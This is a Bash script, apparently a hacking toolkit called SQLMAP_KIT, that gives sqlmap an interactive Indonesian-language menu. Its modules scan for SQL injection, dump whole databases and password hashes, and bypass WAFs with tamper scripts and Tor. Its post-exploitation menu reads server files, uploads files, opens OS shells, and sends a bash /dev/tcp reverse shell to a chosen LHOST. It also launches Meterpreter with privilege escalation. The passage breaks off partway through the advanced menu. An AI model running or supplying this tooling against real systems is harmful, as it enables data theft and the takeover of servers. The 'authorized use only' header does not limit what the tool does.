#!/usr/bin/env bash
# =============================================================================
#  ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗
#  ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
#  ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
#  ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝
#  ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║
#  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
#   ██╗  ██╗██╗████████╗
#   ██║ ██╔╝██║╚══██╔══╝
#   █████╔╝ ██║   ██║
#   ██╔═██╗ ██║   ██║
#   ██║  ██╗██║   ██║
#   ╚═╝  ╚═╝╚═╝   ╚═╝
# =============================================================================
#  SQLMAP_KIT v2.0 — Ultimate Interactive SQLMap Orchestrator
#  Author  : Pixel_Detective (refactored)
#  License : Authorized penetration testing only (RoE)
# =============================================================================

set -uo pipefail
trap 'echo -e "\n\033[1;31m[x] Interrupted (Ctrl+C)\033[0m"; exit 130' INT

# ─────────────────────────────────────────────────────────────────────────────
#  CONFIG & STATE
# ─────────────────────────────────────────────────────────────────────────────
readonly VERSION="2.0"
readonly TOOL_NAME="SQLMAP_KIT"
readonly AUTHOR="Pixel_Detective"
readonly STATE_DIR="${HOME}/.sqlmap_kit"
readonly SESSION_FILE="${STATE_DIR}/session.env"
readonly LOG_FILE="${STATE_DIR}/activity.log"
readonly LOG_MAX_BYTES=$((5 * 1024 * 1024))
readonly REPORTS_DIR="${STATE_DIR}/reports"
mkdir -p "$STATE_DIR" "$REPORTS_DIR"

# Target state
TARGET_URL="" TARGET_METHOD="GET" TARGET_DATA="" TARGET_COOKIE=""
TARGET_HEADERS="" REQUEST_FILE="" OUTPUT_DIR="" DUMP_DIR=""
LEVEL=3 RISK=2 THREADS=5 VERBOSE=1 TIME_SEC=10 DELAY=0 TIMEOUT=30 RETRIES=3
DBMS="" TECHNIQUE="" USER_AGENT="" PROXY="" PROXY_FILE="" TOR=0
AUTH_TYPE="" AUTH_CRED=""
CSRF_TOKEN="" CSRF_URL="" EVAL_EXPR=""
TAMPER="" EXTRA_ARGS=""
USE_RANDOM_AGENT=1 USE_PARSE_ERRORS=1 USE_SMART=0
USE_KEEP_ALIVE=0 USE_HEX=0 USE_CHUNKED=0 USE_FORCE_SSL=0 USE_DROP_COOKIE=0
FLUSH_ONCE=0
LHOST="" LPORT="4444"

# Global arg array — THE critical fix for word-splitting bug
declare -a SQLMAP_ARGS=()

# ─────────────────────────────────────────────────────────────────────────────
#  THEME & UI
# ─────────────────────────────────────────────────────────────────────────────
if [[ -t 1 ]]; then
  R=$'\033[1;31m'; G=$'\033[1;32m'; Y=$'\033[1;33m'; B=$'\033[1;34m'
  M=$'\033[1;35m'; C=$'\033[1;36m'; W=$'\033[1;37m'; D=$'\033[2m'; N=$'\033[0m'
  BR=$'\033[41m'; BG=$'\033[42m'
else
  R="";G="";Y="";B="";M="";C="";W="";D="";N="";BR="";BG=""
fi
readonly OK="${G}[+]${N}" WARN="${Y}[!]${N}" ERR="${R}[x]${N}" INFO="${C}[*]${N}"

readonly BANNER=$'\033[1;36m
  ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗
  ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
  ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
  ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝
  ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
   ██╗  ██╗██╗████████╗
   ██║ ██╔╝██║╚══██╔══╝
   █████╔╝ ██║   ██║
   ██╔═██╗ ██║   ██║
   ██║  ██╗██║   ██║
   ╚═╝  ╚═╝╚═╝   ╚═╝\033[0m'
readonly TAGLINE=$'\033[1;35m     ── Ultimate Interactive SQLMap Orchestrator ──\033[0m'
readonly CREDIT=$'\033[1;33m                SQLMAP_KIT v2.0 · Pixel_Detective\033[0m'

# ─────────────────────────────────────────────────────────────────────────────
#  UTILITIES
# ─────────────────────────────────────────────────────────────────────────────
log() { printf '[%s] [%s] %s\n' "$(date '+%F %T')" "$1" "${*:2}" >> "$LOG_FILE" 2>/dev/null || true; }

rotate_log() {
  [[ -f "$LOG_FILE" ]] || return 0
  local sz; sz=$(stat -c%s "$LOG_FILE" 2>/dev/null || stat -f%z "$LOG_FILE" 2>/dev/null || echo 0)
  if (( sz > LOG_MAX_BYTES )); then
    mv "$LOG_FILE" "${LOG_FILE}.$(date +%s)" 2>/dev/null || true
  fi
}

banner() {
  clear
  printf '%s\n%s\n%s\n\n' "$BANNER" "$TAGLINE" "$CREDIT"
  printf '%s╔══════════════════════════════════════════════════════════════════╗%s\n' "$C" "$N"
  printf '%s║%s %-64s %s║%s\n' "$C" "$N" "${1:0:64}" "$C" "$N"
  printf '%s╚══════════════════════════════════════════════════════════════════╝%s\n' "$C" "$N"
}
hr() { printf '%s\n' "${D}──────────────────────────────────────────────────────────────────${N}"; }
sec() { echo; printf '%s▶ %s%s\n' "$M" "$1" "$N"; hr; }

type_effect() {
  local t="$1" d="${2:-0.005}" i
  for (( i=0; i<${#t}; i++ )); do printf '%s' "${t:i:1}"; sleep "$d"; done
  echo
}

# Read user input safely; returns value to stdout, prompt to stderr
ask() {
  local prompt="$1" def="${2:-}" silent="${3:-}" val=""
  local full="${prompt}${def:+ [$def]}: "
  if [[ "$silent" == "silent" ]]; then
    read -rsp "$full" val </dev/tty || val=""
    echo >&2
  elif [[ -t 0 ]]; then
    read -rep "$full" val </dev/tty || val=""
  else
    read -rp "$full" val || val=""
  fi
  printf '%s' "${val:-$def}"
}

# Numeric validation: usage -> ask_int "Prompt" default min max
ask_int() {
  local prompt="$1" def="$2" min="$3" max="$4" v
  while :; do
    v="$(ask "$prompt ($min-$max)" "$def")"
    if [[ "$v" =~ ^[0-9]+$ ]] && (( v >= min && v <= max )); then
      printf '%s' "$v"; return 0
    fi
    printf '%s\n' "${ERR} ${R}Nilai tidak valid, harus angka $min-$max${N}" >&2
  done
}

confirm() {
  local prompt="$1" expected="$2" ans
  read -rp "$prompt (ketik '$expected'): " ans </dev/tty || return 1
  [[ "$ans" == "$expected" ]]
}

yes_no() {
  local prompt="$1" def="${2:-Y}" ans
  read -rp "$prompt [${def}]: " ans </dev/tty || ans="$def"
  ans="${ans:-$def}"
  [[ "${ans,,}" == "y" || "${ans,,}" == "yes" ]]
}

press_enter() { read -rp "${D}Tekan Enter untuk lanjut...${N}" _ </dev/tty || true; }

url_encode() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$1" 2>/dev/null || printf '%s' "$1"; }

# ─────────────────────────────────────────────────────────────────────────────
#  SESSION MANAGEMENT
# ─────────────────────────────────────────────────────────────────────────────
save_session() {
  {
    for v in TARGET_URL TARGET_METHOD TARGET_DATA TARGET_COOKIE TARGET_HEADERS \
             REQUEST_FILE OUTPUT_DIR DUMP_DIR LEVEL RISK THREADS VERBOSE TIME_SEC \
             DELAY TIMEOUT RETRIES DBMS TECHNIQUE USER_AGENT PROXY PROXY_FILE TOR \
             AUTH_TYPE AUTH_CRED CSRF_TOKEN CSRF_URL EVAL_EXPR TAMPER EXTRA_ARGS \
             USE_RANDOM_AGENT USE_PARSE_ERRORS USE_SMART USE_KEEP_ALIVE USE_HEX \
             USE_CHUNKED USE_FORCE_SSL USE_DROP_COOKIE LHOST LPORT; do
      printf '%s=%q\n' "$v" "${!v}"
    done
  } > "$SESSION_FILE"
  chmod 600 "$SESSION_FILE"
  echo -e "  ${OK} Sesi disimpan: ${D}${SESSION_FILE}${N}"
}

load_session() {
  [[ -f "$SESSION_FILE" ]] || { echo -e "  ${WARN} Tidak ada sesi tersimpan."; return 1; }
  # shellcheck disable=SC1090
  source "$SESSION_FILE"
  echo -e "  ${OK} Sesi dimuat dari: ${D}${SESSION_FILE}${N}"
  show_session
}

show_session() {
  printf '%s┌──[ CURRENT TARGET ]─────────────────────────────────────────────┐%s\n' "$D" "$N"
  printf '  %s Target : %s%s%s\n' "$INFO" "$G" "${TARGET_URL:-<belum diset>}" "$N"
  printf '  %s Method : %s\n' "$INFO" "$TARGET_METHOD"
  [[ -n "$TARGET_DATA" ]]   && printf '  %s POST   : %.40s...\n' "$INFO" "$TARGET_DATA"
  [[ -n "$TARGET_COOKIE" ]] && printf '  %s Cookie : (set, %d chars)\n' "$INFO" "${#TARGET_COOKIE}"
  [[ -n "$REQUEST_FILE" ]]  && printf '  %s ReqFile: %s\n' "$INFO" "$REQUEST_FILE"
  printf '  %s L/R/T  : %s%s / %s / %s%s\n' "$INFO" "$Y" "$LEVEL" "$RISK" "$THREADS" "$N"
  [[ -n "$DBMS" ]]      && printf '  %s DBMS   : %s\n' "$INFO" "$DBMS"
  [[ -n "$TECHNIQUE" ]] && printf '  %s Tech   : %s\n' "$INFO" "$TECHNIQUE"
  [[ -n "$PROXY" ]]     && printf '  %s Proxy  : %s\n' "$INFO" "$PROXY"
  (( TOR )) && printf '  %s Tor    : %sON%s\n' "$INFO" "$G" "$N"
  printf '  %s Output : %s%s%s\n' "$INFO" "$D" "${OUTPUT_DIR:-<belum diset>}" "$N"
  printf '%s└─────────────────────────────────────────────────────────────────┘%s\n' "$D" "$N"
}

# ─────────────────────────────────────────────────────────────────────────────
#  SQLMAP ARG BUILDER — ARRAY BASED (fixes word-splitting bug)
# ─────────────────────────────────────────────────────────────────────────────
build_sqlmap_args() {
  SQLMAP_ARGS=()
  SQLMAP_ARGS+=(--batch)
  [[ -n "$OUTPUT_DIR" ]] && SQLMAP_ARGS+=(--output-dir="$OUTPUT_DIR")

  # Request specification
  if [[ -n "$REQUEST_FILE" && -f "$REQUEST_FILE" ]]; then
    SQLMAP_ARGS+=(-r "$REQUEST_FILE")
  elif [[ "$TARGET_METHOD" == "POST" ]]; then
    SQLMAP_ARGS+=(-u "$TARGET_URL" --data="$TARGET_DATA")
  elif [[ -n "$TARGET_URL" ]]; then
    SQLMAP_ARGS+=(-u "$TARGET_URL")
  fi

  # Session flush (one-time)
  if (( FLUSH_ONCE )); then SQLMAP_ARGS+=(--flush-session); FLUSH_ONCE=0; fi

  # Behavioral flags
  (( USE_RANDOM_AGENT )) && SQLMAP_ARGS+=(--random-agent)
  (( USE_PARSE_ERRORS )) && SQLMAP_ARGS+=(--parse-errors)
  (( USE_SMART ))        && SQLMAP_ARGS+=(--smart)
  (( USE_KEEP_ALIVE ))   && SQLMAP_ARGS+=(--keep-alive)
  (( USE_HEX ))          && SQLMAP_ARGS+=(--hex)
  (( USE_CHUNKED ))      && SQLMAP_ARGS+=(--chunked)
  (( USE_FORCE_SSL ))    && SQLMAP_ARGS+=(--force-ssl)
  (( USE_DROP_COOKIE ))  && SQLMAP_ARGS+=(--drop-set-cookie)

  # Tuning
  (( LEVEL   != 1 )) && SQLMAP_ARGS+=(--level="$LEVEL")
  (( RISK    != 1 )) && SQLMAP_ARGS+=(--risk="$RISK")
  (( THREADS != 1 )) && SQLMAP_ARGS+=(--threads="$THREADS")
  (( VERBOSE != 1 )) && SQLMAP_ARGS+=(-v "$VERBOSE")
  (( DELAY   > 0  )) && SQLMAP_ARGS+=(--delay="$DELAY")
  (( TIMEOUT != 30 )) && SQLMAP_ARGS+=(--timeout="$TIMEOUT")
  (( RETRIES != 3 ))  && SQLMAP_ARGS+=(--retries="$RETRIES")

  # Identity & evasion
  [[ -n "$DBMS" ]]       && SQLMAP_ARGS+=(--dbms="$DBMS")
  [[ -n "$TECHNIQUE" ]]  && SQLMAP_ARGS+=(--technique="$TECHNIQUE")
  [[ -n "$USER_AGENT" ]] && SQLMAP_ARGS+=(--user-agent="$USER_AGENT")
  [[ -n "$PROXY" ]]      && SQLMAP_ARGS+=(--proxy="$PROXY")
  [[ -n "$PROXY_FILE" ]] && SQLMAP_ARGS+=(--proxy-file="$PROXY_FILE")
  (( TOR )) && SQLMAP_ARGS+=(--tor --check-tor)
  [[ -n "$AUTH_TYPE" && -n "$AUTH_CRED" ]] && SQLMAP_ARGS+=(--auth-type="$AUTH_TYPE" --auth-cred="$AUTH_CRED")
  [[ -n "$TAMPER" ]]     && SQLMAP_ARGS+=(--tamper="$TAMPER")

  # Request details
  [[ -n "$TARGET_COOKIE" ]]  && SQLMAP_ARGS+=(--cookie="$TARGET_COOKIE")
  [[ -n "$TARGET_HEADERS" ]] && SQLMAP_ARGS+=(--headers="$TARGET_HEADERS")

  # Advanced
  [[ -n "$CSRF_TOKEN" ]] && SQLMAP_ARGS+=(--csrf-token="$CSRF_TOKEN")
  [[ -n "$CSRF_URL" ]]   && SQLMAP_ARGS+=(--csrf-url="$CSRF_URL")
  [[ -n "$EVAL_EXPR" ]]  && SQLMAP_ARGS+=(--eval="$EVAL_EXPR")

  # Extra raw args (naive split — matches original behaviour)
  if [[ -n "$EXTRA_ARGS" ]]; then
    read -ra _extra <<< "$EXTRA_ARGS"
    SQLMAP_ARGS+=("${_extra[@]}")
  fi
}

# Run sqlmap with pre-built args. Extra args appended to the array are fine.
run_sqlmap() {
  build_sqlmap_args
  local -a full=(sqlmap "${SQLMAP_ARGS[@]}" "$@")
  echo
  printf '%s┌─[ SQLMAP ]───────────────────────────────────────────────────────%s\n' "$C" "$N"
  printf '%s│%s %s\n' "$C" "$N" "${Y}${full[*]}${N}"
  printf '%s└──────────────────────────────────────────────────────────────────%s\n' "$C" "$N"
  log CMD "${full[*]}"
  "${full[@]}" || { local rc=$?; printf '%s sqlmap exit=%d\n' "$WARN" "$rc"; log WARN "exit=$rc"; }
}

# ─────────────────────────────────────────────────────────────────────────────
#  DEPENDENCY CHECK
# ─────────────────────────────────────────────────────────────────────────────
check_deps() {
  local ok=1
  echo -e "${INFO} Memeriksa dependensi..."
  if command -v sqlmap >/dev/null 2>&1; then
    local v; v="$(sqlmap --version 2>/dev/null | head -n1 || echo "?")"
    echo -e "  ${OK} sqlmap    : $v"
  else
    echo -e "  ${ERR} sqlmap    : ${R}TIDAK DITEMUKAN${N}"
    echo -e "      -> Kali/Debian : sudo apt install sqlmap"
    echo -e "      -> Termux      : pip install sqlmap"
    ok=0
  fi
  local bin
  for bin in python3 curl jq wafw00f nmap; do
    if command -v "$bin" >/dev/null 2>&1; then
      printf '  %s %-9s : %s\n' "$OK" "$bin" "$(command -v "$bin")"
    else
      printf '  %s %-9s : %sopsional%s\n' "$WARN" "$bin" "$Y" "$N"
    fi
  done
  command -v msfconsole >/dev/null 2>&1 \
    && echo -e "  ${OK} msfconsole: (untuk --os-pwn)" \
    || echo -e "  ${WARN} msfconsole: opsional (untuk --os-pwn)"
  (( ok ))
}

# ─────────────────────────────────────────────────────────────────────────────
#  SETUP TARGET
# ─────────────────────────────────────────────────────────────────────────────
setup_target() {
  banner "SETUP TARGET & ENVIRONMENT"

  # URL validation loop
  while :; do
    TARGET_URL="$(ask "${C}Target URL${N}")"
    [[ -z "$TARGET_URL" ]] && { echo -e "  ${ERR} URL wajib!"; continue; }
    if [[ ! "$TARGET_URL" =~ ^https?://[^[:space:]]+ ]]; then
      echo -e "  ${WARN} Format harus http(s)://..."; continue
    fi
    break
  done

  local m; m="$(ask "HTTP Method (GET/POST)" "GET")"
  TARGET_METHOD="${m^^}"
  [[ "$TARGET_METHOD" != "GET" && "$TARGET_METHOD" != "POST" ]] && TARGET_METHOD="GET"

  if [[ "$TARGET_METHOD" == "POST" ]]; then
    TARGET_DATA="$(ask 'POST Data (user=admin&pass=123)')"
  else
    TARGET_DATA=""
  fi

  TARGET_COOKIE="$(ask 'Cookie (opsional)' '' silent)"
  TARGET_HEADERS="$(ask 'Custom Headers (opsional, pisah \n)' '')"

  local rf; rf="$(ask 'Load request file (opsional)' '')"
  if [[ -n "$rf" && -f "$rf" ]]; then
    REQUEST_FILE="$rf"
    echo -e "  ${OK} Request file: ${G}$rf${N}"
  else
    REQUEST_FILE=""
  fi

  LEVEL="$(ask_int 'Level' 3 1 5)"
  RISK="$(ask_int 'Risk' 2 1 3)"
  THREADS="$(ask_int 'Threads' 5 1 20)"
  VERBOSE="$(ask_int 'Verbose (0-6)' 1 0 6)"
  TIME_SEC="$(ask_int 'Time-sec (detik)' 10 1 60)"
  DELAY="$(ask_int 'Delay antar request (detik, 0=off)' 0 0 60)"
  TIMEOUT="$(ask_int 'Timeout (detik)' 30 5 300)"

  # Output paths
  local host ts base
  host="$(awk -F/ '{print $3}' <<< "$TARGET_URL" | tr ':' '_' | tr -cd '[:alnum:]._-')"
  ts="$(date '+%Y%m%d_%H%M%S')"
  base="${host:-target}_${ts}"
  if [[ -n "${PREFIX:-}" && "$PREFIX" == *"com.termux"* ]]; then
    OUTPUT_DIR="$(ask 'Output Dir' "$HOME/sqlmap_kit/out/$base")"
    DUMP_DIR="$(ask 'Dump Dir'   "$HOME/sqlmap_kit/dump/$base")"
  else
    OUTPUT_DIR="$(ask 'Output Dir' "./out/$base")"
    DUMP_DIR="$(ask 'Dump Dir'   "./dump/$base")"
  fi
  mkdir -p "$OUTPUT_DIR" "$DUMP_DIR"
  FLUSH_ONCE=1

  echo -e "\n  ${OK} Konfigurasi selesai."
  show_session
  yes_no "  Simpan sesi?" Y && save_session
  press_enter
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 1: RECON & VULN SCANNER
# ─────────────────────────────────────────────────────────────────────────────
menu_recon() {
  while :; do
    banner "MODUL 1: RECON & VULN SCANNER"
    cat <<EOF

  ${C}1)${N} WAF Detection        ${D}(wafw00f + sqlmap --check-waf)${N}
  ${C}2)${N} XSS Reflected Test   ${D}(basic payload probe)${N}
  ${C}3)${N} LFI Path Traversal   ${D}(/etc/passwd probe)${N}
  ${C}4)${N} Nmap Fast Port Scan  ${D}(top-100 ports)${N}
  ${C}5)${N} Security Headers     ${D}(curl -I analysis)${N}
  ${C}6)${N} Robots & Sitemap     ${D}(fetch /robots.txt, /sitemap.xml)${N}
  ${C}7)${N} SQLMap Wizard Mode   ${D}(--wizard, guided)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1)
        command -v wafw00f >/dev/null && run_sqlmap --check-waf 2>/dev/null
        command -v wafw00f >/dev/null && { echo; wafw00f "$TARGET_URL"; } \
          || echo -e "  ${WARN} wafw00f tidak terinstal. Coba: pip install wafw00f"
        ;;
      2)
        local payload="<script>alert(1)</script>"
        local sep="?"; [[ "$TARGET_URL" == *\?* ]] && sep="&"
        echo -e "  ${INFO} Probe: ${payload}"
        curl -s -o /dev/null -w "  HTTP %{http_code}  ·  size %{size_download} bytes\n" \
          -A "Mozilla/5.0" "${TARGET_URL}${sep}q=$(url_encode "$payload")" || true
        ;;
      3)
        local p="../../../../etc/passwd"
        local sep="?"; [[ "$TARGET_URL" == *\?* ]] && sep="&"
        local body
        body="$(curl -s -A "Mozilla/5.0" "${TARGET_URL}${sep}file=$(url_encode "$p")" || true)"
        if grep -q 'root:x:0:0' <<< "$body"; then
          echo -e "  ${R}${BR} RENTAN ${N} ${R}LFI terdeteksi!${N}"
        else
          echo -e "  ${OK} Tidak rentan terhadap probe LFI dasar."
        fi
        ;;
      4)
        local h; h="$(awk -F/ '{print $3}' <<< "$TARGET_URL" | cut -d: -f1)"
        if command -v nmap >/dev/null; then
          run_sqlmap >/dev/null 2>&1 || true
          echo -e "  ${INFO} nmap -F $h"
          nmap -F "$h" || true
        else
          echo -e "  ${WARN} nmap tidak terinstal."
        fi
        ;;
      5)
        echo -e "  ${INFO} curl -sI $TARGET_URL"
        curl -sI "$TARGET_URL" | grep -iE '^(strict-transport|content-security|x-frame|x-content|referrer|permissions|server|set-cookie)' || true
        ;;
      6)
        local root; root="$(awk -F/ '{print $1"//"$3}' <<< "$TARGET_URL")"
        for f in robots.txt sitemap.xml .well-known/security.txt; do
          echo -e "\n  ${INFO} $root/$f"
          curl -s -m 5 "$root/$f" | head -30 || true
        done
        ;;
      7)
        run_sqlmap --wizard
        ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 2: SQL INJECTION & ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
menu_sqli() {
  while :; do
    banner "MODUL 2: SQL INJECTION & ENUMERATION"
    cat <<EOF

  ${C}1)${N} Basic Scan            ${D}(auto-detect injection)${N}
  ${C}2)${N} Enumerate Info        ${D}(banner, user, db, dbs, passwords)${N}
  ${C}3)${N} Enumerate Tables      ${D}(tables & columns)${N}
  ${C}4)${N} Force Technique       ${D}(B/E/U/S/T)${N}
  ${C}5)${N} Tamper / WAF Bypass   ${D}(--tamper presets)${N}
  ${C}6)${N} Forms Detection       ${D}(--forms)${N}
  ${C}7)${N} Crawl Website         ${D}(--crawl=2)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1) run_sqlmap ;;
      2)
        run_sqlmap --banner --current-user --current-db --is-dba
        run_sqlmap --dbs
        run_sqlmap --passwords
        ;;
      3)
        local db tbl
        db="$(ask 'Nama Database')"; [[ -z "$db" ]] && continue
        run_sqlmap -D "$db" --tables
        tbl="$(ask 'Nama Tabel (kosongkan untuk stop)')"; [[ -z "$tbl" ]] && continue
        run_sqlmap -D "$db" -T "$tbl" --columns
        ;;
      4)
        echo -e "  ${D}B=Boolean · E=Error · U=Union · S=Stacked · T=Time${N}"
        TECHNIQUE="$(ask 'Kombinasi teknik' 'UT')"
        run_sqlmap --technique="$TECHNIQUE"
        ;;
      5)
        cat <<EOF
  ${C}1)${N} space2comment          ${D}(basic)${N}
  ${C}2)${N} space2comment,randomcase,between ${D}(medium)${N}
  ${C}3)${N} charencode             ${D}(char encode)${N}
  ${C}4)${N} charunicodeencode      ${D}(unicode)${N}
  ${C}5)${N} Custom
EOF
        local w tamper
        w="$(ask 'Pilih [1-5]' '1')"
        case "$w" in
          1) tamper="space2comment" ;;
          2) tamper="space2comment,randomcase,between" ;;
          3) tamper="charencode" ;;
          4) tamper="charunicodeencode" ;;
          5) tamper="$(ask 'Custom tamper list')" ;;
        esac
        TAMPER="$tamper"
        run_sqlmap --tamper="$tamper"
        ;;
      6) run_sqlmap --forms --crawl=1 ;;
      7)
        local depth; depth="$(ask_int 'Crawl depth' 2 1 5)"
        run_sqlmap --crawl="$depth" --forms
        ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 3: DATA EXTRACTION (DUMP)
# ─────────────────────────────────────────────────────────────────────────────
menu_dump() {
  while :; do
    banner "MODUL 3: DATA EXTRACTION"
    cat <<EOF

  ${C}1)${N} Dump Table            ${D}(specific table)${N}
  ${C}2)${N} Dump Full DB          ${D}(whole database)${N}
  ${C}3)${N} Dump All DBs          ${D}(all non-system)${N}
  ${C}4)${N} Custom SQL Query      ${D}(--sql-query)${N}
  ${C}5)${N} SQL Shell             ${D}(--sql-shell, interactive)${N}
  ${C}6)${N} Search Tables/Cols    ${D}(--search)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1)
        local db tbl
        db="$(ask 'Nama Database')"; [[ -z "$db" ]] && continue
        tbl="$(ask 'Nama Tabel')"; [[ -z "$tbl" ]] && continue
        run_sqlmap -D "$db" -T "$tbl" --dump --threads="$THREADS"
        ;;
      2)
        local db; db="$(ask 'Nama Database')"; [[ -z "$db" ]] && continue
        echo -e "  ${ERR}${BR} WARNING ${N} ${Y}Dump seluruh database — bisa lama!${N}"
        confirm "  Konfirmasi" "DUMP" || continue
        run_sqlmap -D "$db" --dump --threads="$THREADS"
        ;;
      3)
        echo -e "  ${ERR}${BR} WARNING ${N} ${Y}Dump semua DB non-sistem!${N}"
        confirm "  Ketik 'DUMP-ALL' untuk konfirmasi" "DUMP-ALL" || continue
        run_sqlmap --dump-all --exclude-sysdbs --threads="$THREADS"
        ;;
      4)
        local q; q="$(ask 'Query SQL (mis: SELECT user,password FROM users)')"
        [[ -z "$q" ]] && continue
        run_sqlmap --sql-query="$q"
        ;;
      5)
        echo -e "  ${INFO} Masuk ke SQL Shell interaktif. Ketik 'exit' untuk keluar."
        run_sqlmap --sql-shell
        ;;
      6)
        local term; term="$(ask 'Keyword pencarian (tabel/kolom)')"
        [[ -z "$term" ]] && continue
        run_sqlmap --search -T "$term"
        ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 4: POST-EXPLOITATION
# ─────────────────────────────────────────────────────────────────────────────
menu_post() {
  while :; do
    banner "MODUL 4: POST-EXPLOITATION"
    echo -e "  ${R}⚠  Hanya gunakan dengan izin tertulis (RoE)${N}\n"
    cat <<EOF

  ${C}1)${N} Read Server File      ${D}(--file-read)${N}
  ${C}2)${N} Upload File           ${D}(--file-write/--file-dest)${N}
  ${C}3)${N} OS Command Exec       ${D}(--os-cmd)${N}
  ${C}4)${N} OS Interactive Shell  ${D}(--os-shell)${N}
  ${C}5)${N} Reverse Shell Payload ${D}(via --os-cmd)${N}
  ${C}6)${N} Meterpreter (--os-pwn)${D}(butuh Metasploit)${N}
  ${C}7)${N} Windows Registry Read ${D}(--reg-read)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1)
        local f; f="$(ask 'Path file server' '/etc/passwd')"
        run_sqlmap --file-read="$f"
        ;;
      2)
        local src dest
        src="$(ask 'Local file (sumber)')"; [[ ! -f "$src" ]] && { echo -e "  ${ERR} File tidak ada."; press_enter; continue; }
        dest="$(ask 'Destinasi di server' '/tmp/payload.txt')"
        run_sqlmap --file-write="$src" --file-dest="$dest"
        ;;
      3)
        local cmd; cmd="$(ask 'Perintah OS' 'whoami')"
        run_sqlmap --os-cmd="$cmd"
        ;;
      4)
        echo -e "  ${WARN} Anda akan masuk OS shell. 'exit' untuk keluar."
        sleep 1
        run_sqlmap --os-shell
        ;;
      5)
        LHOST="$(ask 'IP LHOST')"
        LPORT="$(ask_int 'Port LPORT' 4444 1 65535)"
        echo -e "  ${INFO} Listener: ${G}nc -lvnp $LPORT${N}"
        yes_no "  Kirim payload reverse shell sekarang?" N || continue
        run_sqlmap --os-cmd="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        ;;
      6)
        if ! command -v msfconsole >/dev/null; then
          echo -e "  ${ERR} msfconsole tidak terinstal."
        else
          LHOST="$(ask 'LHOST untuk Meterpreter')"
          LPORT="$(ask_int 'LPORT' 4444 1 65535)"
          run_sqlmap --os-pwn --msf-path="$(command -v msfconsole)" --priv-esc
        fi
        ;;
      7)
        run_sqlmap --reg-read
        ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 5: ADVANCED / EVASION / AUTH
# ─────────────────────────────────────────────────────────────────────────────
menu_advanced() {
  while :; do
    banner "MODUL 5: ADVANCED & EVASION"
    cat <<EOF

  ${C}1)${N} Proxy Setup           ${D}(Burp / custom / proxy-file)${N}
  ${C}2)${N} Tor Routing           ${D}(--tor --check-tor)${N}
  ${C}3)${N} Authentication        ${D}(--auth-type / --auth-cred)${N}
  ${C}4)${N} CSRF Token Handling   ${D}(--csrf-token / --csrf-url)${N}
  ${C}5)${N} Behavioral Flags      ${D}(hex, chunked, force-ssl, ...)${N}
  ${C}6)${N} DBMS Force            ${D}(--dbms)${N}
  ${C}7)${N} Custom --eval         ${D}(python code)${N}
  ${C}8)${N} Extra Raw Args        ${D}(free-form)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1)
        echo -e "  ${C}1)${N} Burp (127.0.0.1:8080)  ${C}2)${N} Custom  ${C}3)${N} Proxy-file  ${C}4)${N} Matikan"
        local p; p="$(ask 'Pilih' '1')"
        case "$p" in
          1) PROXY="http://127.0.0.1:8080"; PROXY_FILE=""; TOR=0 ;;
          2) PROXY="$(ask 'Proxy URL (http://host:port)')" ;;
          3) PROXY_FILE="$(ask 'Path proxy-list.txt')" ;;
          4) PROXY=""; PROXY_FILE=""; TOR=0 ;;
        esac
        ;;
      2) TOR=$(( TOR ? 0 : 1 )); echo -e "  ${OK} Tor: $([[ $TOR == 1 ]] && echo ON || echo OFF)" ;;
      3)
        AUTH_TYPE="$(ask 'Auth type (Basic/Digest/Bearer)' 'Basic')"
        AUTH_CRED="$(ask 'Auth cred (user:pass)' '' silent)"
        ;;
      4)
        CSRF_TOKEN="$(ask 'CSRF token param name' 'csrf_token')"
        CSRF_URL="$(ask 'CSRF URL (opsional)')"
        ;;
      5)
        USE_HEX=$(( USE_HEX ? 0 : 1 ))
        USE_CHUNKED=$(( USE_CHUNKED ? 0 : 1 ))
        USE_FORCE_SSL=$(( USE_FORCE_SSL ? 0 : 1 ))
        USE_DROP_COOKIE=$(( USE_DROP_COOKIE ? 0 : 1 ))
        echo -e "  hex=$USE_HEX chunked=$USE_CHUNKED force-ssl=$USE_FORCE_SSL drop-cookie=$USE_DROP_COOKIE"
        ;;
